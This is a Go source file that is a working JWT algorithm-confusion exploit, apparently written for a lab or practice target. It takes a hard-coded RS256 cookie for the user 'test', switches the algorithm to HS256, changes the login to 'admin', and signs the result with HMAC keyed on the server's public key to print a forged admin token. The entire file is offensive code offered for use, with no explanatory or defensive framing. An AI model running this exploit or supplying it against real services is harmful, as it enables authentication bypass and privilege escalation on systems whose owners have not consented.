package main

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"strings"
)

func computeHS256(message, secret string) string {
	key := []byte(secret)
	h := hmac.New(sha256.New, key)
	h.Write([]byte(message))
	encoded := base64.URLEncoding.EncodeToString(h.Sum(nil))
	sig := strings.ReplaceAll(string(encoded), "=", "")
	fmt.Println("[*] New HMAC Signature:")
	fmt.Println(sig)
	return sig
}

// split token into header and payload
func parseToken(token string) ([]byte, []byte) {
	tmp := strings.Split(token, ".")
	header, _ := base64.RawStdEncoding.DecodeString(tmp[0])
	payload, _ := base64.RawStdEncoding.DecodeString(tmp[1])
	fmt.Println("[*] Original:")
	fmt.Println(string(header))
	fmt.Println(string(payload))
	return header, payload
}

// insert malicious values into token and return data for signing
func attackToken(header, payload []byte) string {
	mh := []byte(strings.ReplaceAll(string(header), "RS256", "HS256"))
	mp := []byte(strings.ReplaceAll(string(payload), "test", "admin"))
	fmt.Println("[*] Malicious Replacement:")
	fmt.Println(string(mh))
	fmt.Println(string(mp))
	eh := strings.ReplaceAll(base64.URLEncoding.EncodeToString(mh), "=", "")
	ep := strings.ReplaceAll(base64.URLEncoding.EncodeToString(mp), "=", "")
	data := strings.Join([]string{eh, ep}, ".")
	return data
}

func bakeNewToken(data string, sig string) string {
	combined := strings.Join([]string{data, sig}, ".")
	return combined
}

func main() {
	// known public key
	pub, _ := ioutil.ReadFile("public.pem")
	// auth cookie when logged in as "test"
	token := "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6InRlc3QifQ.ZabKsEue5gDPyvwNnS8Xned104AR5V4LFaM4ApaLM9OvG2SEQbiiOwLvwFXM0mqAI7xoJXDosbjvNFzz21rthQDZseZkrw9Ogebbxr6b14wO6p64VQV0siBKroL_xWa8o5chkSru1kEEHAsEm5CaZvQlhshDvZc0gf-_eE0ZPudVO2j3ie_70dEqVCQJ5d86iYp5Ob0SRJdjpXNnYcmFnj9KOLnuM6TGzYExWqVRw2II2Iovjahq0IjacnnO47Hpixe8YHuTVZtzDTNLcqGvslNxYAq2efMWLktqM6rOU5k-CrtqVV3vc1bgcXmTOCI2_3FsnDQ2_hssWaocA18EEw"

	h, p := parseToken(token)
	data := attackToken(h, p)
	sig := computeHS256(data, string(pub))
	res := bakeNewToken(data, sig)

	fmt.Println("[*] Final payload:")
	fmt.Println(res)

}
